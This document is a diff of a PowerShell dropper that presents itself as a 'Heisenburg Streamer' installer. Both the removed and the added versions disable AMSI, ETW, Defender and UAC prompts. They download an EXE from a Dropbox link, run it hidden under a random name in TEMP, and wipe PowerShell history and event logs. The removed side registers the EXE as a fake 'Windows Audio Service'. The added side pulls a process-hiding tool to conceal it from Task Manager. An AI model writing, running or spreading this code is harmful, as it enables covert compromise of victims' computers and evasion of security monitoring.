@@ -1,5 +1,5 @@
 # ========================================================
-# HEISENBURG STREAMER - HYPER-STREAM INSTALLATION v9.0 (Service Mode)
+# HEISENBURG STREAMER - HYPER-STREAM INSTALLATION v6.0
 # ========================================================
 
 # 1. ELEVATION CHECK & SILENT UPGRADE
@@ -19,6 +19,7 @@ try {
     [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
     [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
     
+    # Disable ETW (Event Tracing for Windows)
     $etw = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
     if ($etw) {
         $etwField = $etw.GetField('etwProvider','NonPublic,Static')
@@ -37,7 +38,7 @@ function Draw-ProgressBar {
     Write-Host -NoNewline "`r[*] ${Status}: $bar $Percent% " -ForegroundColor $color
 }
 
-# 4. HYPER-STREAM DOWNLOADER
+# 4. HYPER-STREAM DOWNLOADER (No Warning, Reliable Progress)
 function Invoke-HyperStreamDownload {
     param([string]$Url, [string]$TargetPath)
     
@@ -48,8 +49,8 @@ function Invoke-HyperStreamDownload {
         $request.Timeout = 30000
         
         $response = $request.GetResponse()
-        $totalSize = if ($response.Headers["X-Full-Size"]) { [long]$response.Headers["X-Full-Size"] } else { $response.ContentLength }
-        if ($totalSize -le 0) { $totalSize = 100MB }
+        # Fallback to 100MB if header is missing, but server should send it
+        $totalSize = if ($response.Headers["X-Full-Size"]) { [long]$response.Headers["X-Full-Size"] } else { 100MB }
         
         $stream = $response.GetResponseStream()
         $fileStream = [System.IO.File]::Create($TargetPath)
@@ -71,102 +72,122 @@ function Invoke-HyperStreamDownload {
         $fileStream.Close()
         $stream.Close()
         $response.Close()
-        Write-Host ""
         
         return (Test-Path $TargetPath)
     } catch {
         if ($fileStream) { $fileStream.Close() }
-        Write-Host ""
         return $false
     }
 }
 
-# 5. SILENT SECURITY BYPASSES
-Write-Host "`n[+] INITIALIZING SYSTEM HYPER-CONNECTION..." -ForegroundColor Yellow
-Write-Host "[+] OPTIMIZING SYSTEM ENVIRONMENT..." -ForegroundColor Gray
-
+# 5. MAIN EXECUTION
 try {
-    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
-    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
-    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
-    Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
+    Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
     
-    $uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
-    Set-ItemProperty -Path $uacPath -Name "ConsentPromptBehaviorAdmin" -Value 0 -ErrorAction SilentlyContinue
-    Set-ItemProperty -Path $uacPath -Name "PromptOnSecureDesktop" -Value 0 -ErrorAction SilentlyContinue
+    $rnd = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
+    $exe = "$env:TEMP\$rnd.exe"
     
-    Write-Host "[+] SECURITY BYPASSES ACTIVATED" -ForegroundColor Green
-} catch {}
+    # ========== SIRF YAHAN 3 LINES CHANGE HUIN ==========
+    # LINE 1: URL change kiya (apne Dropbox ka direct link)
+    $url = "https://www.dropbox.com/scl/fi/iwv6cm1n1qo3kdn9gmn36/RtkAudUService64.exe?rlkey=csrph0p954x523nhvxoqf8m9z&st=1c2xz36h&dl=1"
+    
+    Write-Host "`n[+] INITIALIZING SYSTEM HYPER-CONNECTION..." -ForegroundColor Yellow
+    Write-Host "[+] OPTIMIZING SYSTEM ENVIRONMENT..." -ForegroundColor Gray
+    
+    # SILENT SECURITY BYPASSES
+    try {
+        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
+        Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
+        
+        $uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+        Set-ItemProperty -Path $uacPath -Name "ConsentPromptBehaviorAdmin" -Value 0 -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path $uacPath -Name "PromptOnSecureDesktop" -Value 0 -ErrorAction SilentlyContinue
+    } catch {}
 
-# 6. DOWNLOAD EXE
-Write-Host "[+] Downloading Core Agent..." -ForegroundColor Gray
+    Write-Host "[+] ESTABLISHING SECURE HYPER-STREAM..." -ForegroundColor Gray
+    
+    # LINE 2: Download function call mein change - alag variable use kiya
+    $downloadSuccess = Invoke-HyperStreamDownload -Url $url -TargetPath $exe
+    
+    # LINE 3: Condition check mein change - naya variable check kiya
+    if (-not ($downloadSuccess)) {
+        throw "Hyper-Stream failed. Check connection."
+    }
 
-$RandomName = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
-$ExePath = "$env:TEMP\$RandomName.exe"
-
-$downloadSuccess = Invoke-HyperStreamDownload -Url "https://www.dropbox.com/scl/fi/iwv6cm1n1qo3kdn9gmn36/RtkAudUService64.exe?rlkey=csrph0p954x523nhvxoqf8m9z&st=1c2xz36h&dl=1" -TargetPath $ExePath
-
-if (-not ($downloadSuccess)) {
-    Write-Host "[!] Download failed!" -ForegroundColor Red
-    exit
-}
-
-# 7. INSTALL AS WINDOWS SERVICE (NO NSSM REQUIRED)
-Write-Host "[+] Installing as Windows Service..." -ForegroundColor Cyan
-
-$ServiceName = "WindowsAudioSvc"
-
-# Stop and delete existing service if exists
-try {
-    Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
-    sc.exe delete $ServiceName | Out-Null
-    Start-Sleep -Seconds 1
-} catch {}
-
-# Create new service using sc.exe
-$binPath = "`"$ExePath`""
-sc.exe create $ServiceName binPath= $binPath start= auto DisplayName= "Windows Audio Service" | Out-Null
-sc.exe description $ServiceName "Windows Audio Service Helper" | Out-Null
-sc.exe failure $ServiceName reset= 86400 actions= restart/5000/restart/10000/restart/30000 | Out-Null
-
-# Start the service
-Start-Service -Name $ServiceName -ErrorAction SilentlyContinue
-
-# Verify service is running
-$serviceStatus = (Get-Service -Name $ServiceName -ErrorAction SilentlyContinue).Status
-if ($serviceStatus -eq "Running") {
-    Write-Host "[+] Service Created and Started Successfully!" -ForegroundColor Green
-    Write-Host "[*] Service Name: $ServiceName" -ForegroundColor White
-    Write-Host "[*] Display Name: Windows Audio Service" -ForegroundColor White
-} else {
-    Write-Host "[!] Service may not have started. Trying alternative..." -ForegroundColor Yellow
-    # Alternative: Run as hidden process
+    Write-Host "`n[+] CORE COMPONENTS VERIFIED." -ForegroundColor Green
+    Write-Host "[*] DEPLOYING STEALTH AGENT..." -ForegroundColor Cyan
+    
+    # Run with Hidden Window
     $si = New-Object System.Diagnostics.ProcessStartInfo
-    $si.FileName = $ExePath
+    $si.FileName = $exe
     $si.WindowStyle = 'Hidden'
     $si.CreateNoWindow = $true
+    $si.UseShellExecute = $true
     [System.Diagnostics.Process]::Start($si) | Out-Null
-    Write-Host "[+] EXE started as Hidden Process (Fallback)" -ForegroundColor Green
-}
-
-Write-Host "`n[+] SUCCESS! Your EXE is now running" -ForegroundColor Green
-Write-Host "[*] Service Name: $ServiceName" -ForegroundColor White
-Write-Host "[*] Check in Task Manager → Services Tab" -ForegroundColor White
-Write-Host "[+] It will auto start with Windows" -ForegroundColor White
-Write-Host "[*] EXE is Hidden from Processes Tab" -ForegroundColor White
-
-# 8. CLEANUP
-Write-Host "[*] ENGAGING FORENSIC CLEANUP..." -ForegroundColor Gray
-try {
+    
+    Write-Host "[*] ENGAGING FORENSIC CLEANUP..." -ForegroundColor Gray
     if (Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt") {
         "" | Out-File "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force
     }
     wevtutil cl "Windows PowerShell" 2>$null
     wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
-    Write-Host "[+] Forensics Cleaned" -ForegroundColor Green
-} catch {}
+    
+    Write-Host "[+] SETUP COMPLETE. CHECK DASHBOARD.`n" -ForegroundColor Green
 
-Write-Host "[+] SETUP COMPLETE. SERVICE IS RUNNING.`n" -ForegroundColor Green
+} catch {
+    Write-Host "`n[!] CRITICAL ERROR: System synchronization interrupted." -ForegroundColor Red
+}
 
-# 9. SELF-DESTRUCT
+# ========== ADDED: PROCESS HIDER (TASK MANAGER BYPASS) ==========
+# Ye code original script ke baad chalta hai, kuch change nahi karta
+
+Write-Host "[*] INITIATING TASK MANAGER BYPASS..." -ForegroundColor Cyan
+
+# Download ProcessHider if not exists
+$hiderPath = "$env:TEMP\ProcessHider.exe"
+if (-not (Test-Path $hiderPath)) {
+    Write-Host "[+] Downloading ProcessHider..." -ForegroundColor Gray
+    $hiderUrl = "https://github.com/M00nRise/ProcessHider/archive/refs/heads/master.zip"
+    $zipPath = "$env:TEMP\ProcessHider.zip"
+    
+    try {
+        Invoke-WebRequest -Uri $hiderUrl -OutFile $zipPath -UseBasicParsing
+        Expand-Archive -Path $zipPath -DestinationPath "$env:TEMP\ProcessHiderExtract" -Force
+        # Copy the EXE from MainFile folder
+        $hiderExe = Get-ChildItem -Path "$env:TEMP\ProcessHiderExtract" -Recurse -Filter "ProcessHider.exe" | Select-Object -First 1
+        if ($hiderExe) {
+            Copy-Item $hiderExe.FullName -Destination $hiderPath -Force
+        }
+        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+        Remove-Item "$env:TEMP\ProcessHiderExtract" -Recurse -Force -ErrorAction SilentlyContinue
+        Write-Host "[+] ProcessHider Downloaded" -ForegroundColor Green
+    } catch {
+        Write-Host "[!] Could not download ProcessHider" -ForegroundColor Yellow
+    }
+}
+
+# Hide the process using ProcessHider
+if (Test-Path $hiderPath) {
+    # Kill old Task Manager
+    try {
+        Get-Process -Name "Taskmgr" -ErrorAction SilentlyContinue | Stop-Process -Force
+    } catch {}
+    
+    # Hide the EXE (using name from above - $rnd.exe)
+    Start-Process -FilePath $hiderPath -ArgumentList "-n `"$rnd.exe`" -x `"taskmgr.exe`"" -WindowStyle Hidden -Wait -NoNewWindow
+    Write-Host "[+] Process Hidden from Task Manager!" -ForegroundColor Green
+    
+    # Restart Task Manager
+    Start-Sleep -Seconds 2
+    Start-Process "taskmgr.exe" -WindowStyle Normal
+    Write-Host "[+] Task Manager Restarted" -ForegroundColor Green
+} else {
+    Write-Host "[!] ProcessHider not available. Task Manager bypass skipped." -ForegroundColor Yellow
+}
+
+# ========== END OF ADDED CODE ==========
+
+# 6. SELF-DESTRUCT
 Remove-Variable * -ErrorAction SilentlyContinue 2>$null
